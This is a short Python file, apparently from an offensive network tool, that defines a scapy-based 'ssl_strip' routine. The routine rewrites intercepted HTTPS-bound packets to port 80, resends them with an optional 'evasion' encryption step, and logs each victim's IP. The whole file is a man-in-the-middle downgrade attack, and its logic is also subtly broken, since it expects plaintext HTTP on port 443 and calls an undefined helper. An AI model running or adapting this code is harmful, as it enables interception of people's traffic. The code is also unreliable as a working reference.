from scapy.all import *
from scapy.layers.http import HTTPRequest, HTTPResponse
import logging

logger = logging.getLogger(__name__)

async def ssl_strip(packet, config):
    if packet.haslayer(TCP) and packet[TCP].dport == 443 and packet.haslayer(HTTPRequest):
        try:
            new_packet = packet.copy()
            new_packet[TCP].dport = 80
            if config['evasion']['use_encryption']:
                new_packet = encrypt_packet(new_packet)
            send(new_packet, iface=config['interface'])
            logger.info(f"SSL stripped for {packet[IP].src}")
            return True
        except Exception as e:
            logger.error(f"SSL strip failed: {e}")
    return False
